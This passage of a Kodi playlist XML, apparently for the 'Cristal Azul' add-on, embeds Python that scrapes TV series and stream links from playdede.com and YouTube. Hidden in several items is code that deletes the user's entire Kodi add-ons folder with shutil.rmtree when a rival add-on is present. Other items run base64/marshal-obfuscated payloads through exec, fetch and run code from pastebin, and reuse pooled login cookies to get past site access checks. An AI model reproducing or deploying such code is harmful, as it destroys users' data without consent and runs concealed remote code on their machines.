import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/V9SqzX4.jpg</thumbnail>
<fanart>https://i.imgur.com/RsLj1lh.jpg</fanart>
</item>











<item>
<title>[COLOR gold]* [COLOR lightseagreen]Series android[COLOR lightseagreen][[COLOR white]Buscador[COLOR lightseagreen]][/COLOR]</title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = '(?s)class="item tvshows">.*?href="(https://playdede.com/serie.*?)".*?src="(.*?)".*?<p>(.*?)<.*?<h3>(.*?)<.*?span>(.*?)<'
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    Palabra_Buscada = xbmcgui.Dialog().input('Buscar Peliculas: ', type=xbmcgui.INPUT_ALPHANUM)
    Palabra_Buscada = six.ensure_str(Palabra_Buscada).replace(" ", "+").replace("á", "a").replace("é", "e").replace("í", "i").replace("á", "a").replace("ú", "u")
    response = requests.get('https://playdede.com/search/?s='+Palabra_Buscada, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+'*'+response))
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        url = item[0]
        imagen = item[1]
        anio = item[2]
        anio = six.ensure_str(anio).replace('á', 'a').replace('é', 'e').replace('í', 'i').replace('ó', 'o').replace('ú', 'u').replace('Á', 'A').replace('É', 'E').replace('Ó', 'O').replace('Ú', 'U').replace('ñ', 'n')
        titulo = item[3]
        categoria = item[4]
        video += [(titulo, imagen, url, anio, categoria)]
    return [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white] ('+str(numero_total)+')', ' ')] + sorted(video) + [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR white]No hay mas resultados...', ' ')]

  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,serie=serie):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = """(?s)class='se-c' data-season='(\d+)"""
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        video += [('Temporada', item)]
    return [('[COLOR aqua]Cristal Azul Temporadas '+serie, ' ')] + video + [('[COLOR white]No hay mas resultados...', ' ')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,temporada=temporada):
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    patron = '(?s)href="(.*?)".*?src="(.*?)".*?epst"(.*?)<.*?numerando">(.*?)<'
    data = re.findall(patron, response.split("class='se-c' data-season='"+temporada+"'")[1].split("</ul></div></div>")[0])
    numero_total = len(data)
    return [(' ', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados Capitulos: [COLOR white] ('+str(numero_total)+')')] + data + [(' ', ' ', ' ', '[COLOR white]No hay mas resultados...')]
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url):

  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'streamspro' in id:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    patron = '(?s)href="(.*?)".*?src.*?>(.*?)<.*?>(.*?)<.*?languages/(.*?)[_\.]'
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response.split("linksUsers")[1].split("linksUsers")[0])
    try:
        enlaces_post = re.findall('(?s)playerItem.*?lang="(.*?)".*?Player="(.*?)".*?h3>(.*?)<.*?Calidad: (.*?)<', response)
        lista_post = []
        for item in enlaces_post:
            if 'powvideo' in item[2] or 'waaw' in item[2] or 'streamplay' in item[2] or 'vidtodo' in item[2]:
                url = ''
            else:
                lista_post += [(item[1], '[COLOR gold]E.Oficial '+item[2], item[3], item[0])]
    except:
        lista_post = []
    data = lista_post + data
    videos = []
    for item in data:
      if 'powvideo' in item[1] or 'waaw' in item[1] or 'streamplay' in item[1] or 'vidtodo' in item[1]:
          url = ''
      else:
          url = item[0]
          servidor = item[1]
          calidad = item[2]
          idioma = item[3]
          videos += [(url, servidor, calidad, idioma)]
    numero_total = len(videos)
    return [('http', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados links: [COLOR white] ('+str(numero_total)+')')] + videos + [('http', ' ', ' ', '[COLOR white]No hay mas resultados...')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url,referer=referer):

  if 'http' in url:
    return url
  else:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia )
    patron = "src='(.*?)'"
    data = "------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\ngetPlayer\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n" + url + "\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"width\"\r\n\r\n601\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n540\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE--\r\n"
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        #response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
        response = requests.get('https://playdede.com/embed.php?id='+url+'&width=601&height=540', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}).text
        response = six.ensure_str(response)
        url_post = re.findall(patron, response)[0]
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
            response = six.ensure_str(response)
            url_post = re.findall(patron, response)[0]
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            break
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+str(contador)+'*'+response))
    return url_post.replace('\/', '/')
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://pastebin.com/raw/FzdqRYcC', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/S1r1T5Y.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>










<item>
<title>[COLOR yellow]+[/COLOR][COLOR white]Sin encriptar PLAYLIST, CHANNEL Y SUELTO ARREGLADA[/COLOR]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR yellow]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/zMg28gY.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/playlist?list=PLOwMvBWGjS50Gt8EFb0kjIFddrimFQ-zG'
import re,six
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if six.PY2:
      import urllib2
      SOLICITUD = urllib2.urlopen(urllib2.Request(url)).read()
  else:
      import urllib.request
      SOLICITUD = urllib.request.urlopen(urllib.request.Request(url)).read().decode('utf-8')
  if 'channel' in url or 'youtube.com/c/' in url or 'youtube.com/user' in url:
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', SOLICITUD)
  elif 'list' in url:
    return re.findall('(?s)"title":.*?text"."(.*?)".*?url.*?url.*?Id"."(.*?)"', SOLICITUD)
  else:
    titulo = re.findall('<meta name="title" content="(.*?)"', SOLICITUD)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/pe8exhb.jpg</thumbnail>
<fanart>https://i.imgur.com/zMg28gY.jpg</fanart>
 </item>
 
















<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]sERIES [COLOR white]PRODUCTORAS[/COLOR]</title>
<link>$doregex[makelist]</link>
<regex>
<name>makelist</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist.param1][/COLOR]</title>
<link>$doregex[makelist2]</link>
<thumbnail>[makelist.param3]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
def GetLSProData(page_data,Cookie_Jar,m):#CpRdIsSaTvAmL
  response = requests.get('https://pastebin.com/raw/mRDFTn7Y', verify=False).text
  items = re.findall('(?s)"titulo":"(.*?)".*?"url":"(.*?)".*?"imagen":"(.*?)"', response)
  numero_total = len(items)
  return [('[COLOR aqua]Cristal Azul, Productoras:[COLOR white] ('+str(numero_total)+')', ' ', 'https://i.imgur.com/5kY0BRB.png')] + sorted(items) + [('[COLOR white]No hay mas resultados...', ' ', 'https://i.imgur.com/5kY0BRB.png')]
]]></expres>
<page></page>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist.param2]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m,url=url):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = '(?s)"item movies">.*?href="(.*?)".*?src="(.*?)".*?alt="(.*?)".*?p>(.*?)<.*?span>.(.*?)<'
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
        response = six.ensure_str(response)
        data = re.findall(patron, response)
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
            response = six.ensure_str(response)
            data = re.findall(patron, response)
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            return [(' ', 'https://i.imgur.com/r6aXooD.jpg', ' ', '[COLOR white]Web en Mantenimiento', ' ')]
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        url = item[0]
        imagen = item[1]
        titulo = item[2]
        titulo = six.ensure_str(titulo).replace('á', 'a').replace('é', 'e').replace('í', 'i').replace('ó', 'o').replace('ú', 'u').replace('Á', 'A').replace('É', 'E').replace('Ó', 'O').replace('Ú', 'U').replace('ñ', 'n')
        anio = item[3]
        categoria = item[4]
        video += [(titulo, imagen, url, anio, categoria)]
    return [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white] ('+str(numero_total)+')', ' ')] + sorted(video) + [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR white]No hay mas resultados...', ' ')]

  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
